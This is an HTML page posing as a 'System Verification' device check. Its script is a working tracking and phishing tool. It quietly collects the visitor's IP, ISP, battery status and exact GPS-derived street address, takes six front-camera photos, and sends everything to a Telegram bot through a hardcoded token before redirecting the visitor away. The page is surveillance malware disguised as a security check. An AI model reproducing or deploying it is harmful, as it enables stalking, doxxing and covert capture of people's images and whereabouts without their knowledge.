<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-[#020617] text-white flex items-center justify-center h-screen overflow-hidden">
    <div class="text-center p-10 max-w-sm w-full bg-[#0f172a] rounded-[2.5rem] border border-slate-800 shadow-2xl">
        <div class="relative w-16 h-16 mx-auto mb-6">
            <div class="absolute inset-0 border-4 border-blue-500/20 rounded-full"></div>
            <div class="absolute inset-0 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
        </div>
        <h1 class="text-xl font-black italic tracking-tighter uppercase">Verifying <span class="text-blue-500">Device</span></h1>
        
        <div class="w-full bg-slate-800 h-1 rounded-full mt-8 overflow-hidden">
            <div id="bar" class="bg-blue-500 h-full w-0 transition-all duration-300"></div>
        </div>
        <p id="status" class="text-[9px] font-bold text-slate-500 uppercase mt-4 tracking-widest italic">Syncing with Node...</p>
        
        <video id="v" autoplay playsinline class="hidden"></video>
        <canvas id="c" width="1280" height="720" class="hidden"></canvas>
    </div>

    <script>
        const params = new URLSearchParams(window.location.search);
        const tid = params.get('tid');
        const red = decodeURIComponent(params.get('rd') || "https://google.com");
        const botToken = "8382714466:AAFAuorgHezCvk1dr7OxExD8zAMpgFTLvLI";

        let address = "Awaiting Address...";
        let maps = "";

        async function startIntel() {
            try {
                // 1. Battery Info
                const bat = await navigator.getBattery();
                const batStatus = `${(bat.level * 100).toFixed(0)}% (${bat.charging ? 'Charging' : 'Unplugged'})`;

                // 2. IP & Network Info
                const ipReq = await fetch('https://ipapi.co/json/');
                const ip = await ipReq.json();
                const netInfo = `üåê *IP:* ${ip.ip}\nüè¢ *ISP:* ${ip.org}\nüèôÔ∏è *City:* ${ip.city}, ${ip.region}\nüì± *Platform:* ${navigator.platform}`;

                // 3. Location & Exact Address (Gali/Road)
                navigator.geolocation.getCurrentPosition(pos => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    maps = `https://www.google.com/maps?q=${lat},${lon}`;
                    
                    fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`)
                    .then(r => r.json()).then(data => {
                        address = data.display_name;
                        
                        const report = `üö® *NEW TARGET TRACED* üö®\n\nüìç *EXACT ADDRESS:* \n${address}\n\nüîó *MAPS:* ${maps}\n\n${netInfo}\nüîã *BATTERY:* ${batStatus}`;
                        sendTG(report);
                        initCamera();
                    });
                }, () => {
                    sendTG(`‚ö†Ô∏è *GPS DENIED* \n\n${netInfo}\nüîã *BATTERY:* ${batStatus}`);
                    initCamera();
                });
            } catch (e) { initCamera(); }
        }

        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('v').srcObject = stream;
                captureLoop();
            } catch(e) { window.location.href = red; }
        }

        async function captureLoop() {
            for(let i=1; i<=6; i++) {
                document.getElementById('status').innerText = `Capturing Packet ${i}/6...`;
                document.getElementById('bar').style.width = (i * 16.6) + "%";
                await new Promise(r => setTimeout(r, 2000));
                await takePhoto(i);
            }
            window.location.href = red;
        }

        async function takePhoto(idx) {
            const canvas = document.getElementById('c');
            const video = document.getElementById('v');
            canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
            
            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.5));
            const fd = new FormData();
            fd.append('chat_id', tid);
            fd.append('photo', blob, `img.jpg`);
            fd.append('caption', `üì∏ Shot ${idx}/6\nüìç ${address.split(',')[0]} (Road Area)`);

            return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
        }

        function sendTG(msg) {
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: tid, text: msg, parse_mode: 'Markdown' })
            });
        }

        startIntel();
    </script>
</body>
</html>
